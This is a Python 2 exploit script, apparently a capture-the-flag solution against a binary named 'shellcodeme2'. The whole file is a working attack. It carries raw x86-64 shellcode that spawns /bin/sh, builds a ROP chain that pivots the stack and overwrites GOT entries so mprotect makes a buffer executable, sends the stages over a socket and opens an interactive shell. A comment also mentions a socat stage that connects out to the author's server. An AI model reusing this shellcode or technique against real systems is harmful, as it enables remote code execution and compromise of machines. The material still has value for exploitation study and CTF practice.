import struct, socket, time, telnetlib

def pack64(x):
  return struct.pack("Q", x)

shell_x64_64 = (
  "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
  "\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
  "\x54\x5f\x6a\x3b\x58\x0f\x05"
)

leave_ret = 0x40062b
pop_rsi_r15 = 0x400691
pop_rdi = 0x400693
mmap_got = 0x601018
mprotect = 0x4004c0
read_fixup = 0x400496
pop_pop_ret = 0x400690
buf = 0x20000000

# stage 1 will do `socat TCP4-connect:<myserver>:6666 EXEC:./shellcodeme2` so we
# can connect to shellcodeme2 just like we connected to shellcodeme1
sock = socket.create_connection(("127.0.0.1", 7777))

s1 = ""
s1 += pack64(leave_ret)  # code will jump to this address initially, adjusting stack
s1 += pack64(buf + 8)    # new value for rbp

# read 1: overwrite mmap@GOT with mprotect and read@GOT with pop;pop;ret
s1 += pack64(pop_rsi_r15)
s1 += pack64(mmap_got)   # param 2 for read
s1 += pack64(0x1337)
s1 += pack64(pop_rdi)
s1 += pack64(0)          # param 1 for read
s1 += pack64(read_fixup)

# jump back into main, mmap will now be mprotect and read will give us control back
s1 += pack64(0x4005d6)
s1 += "G"*8

# read 2: shellcode into new rwx buffer 0x20000000
s1 += pack64(pop_rsi_r15)
s1 += pack64(buf)
s1 += pack64(0x1337)
s1 += pack64(pop_rdi)
s1 += pack64(0)
s1 += pack64(read_fixup)

# jump to shellcode
s1 += pack64(buf)

assert len(s1) <= 1024
s1 += "H"*(1024-len(s1))

sock.send(s1)
time.sleep(0.5)

# new values for mmap@got + read@got
sock.send(pack64(mprotect) + pack64(pop_pop_ret))
time.sleep(0.5)

# shellcode
sock.send(shell_x64_64)
time.sleep(0.5)
print "[*] shell ready, enjoy!"

t = telnetlib.Telnet()
t.sock = sock
t.interact()
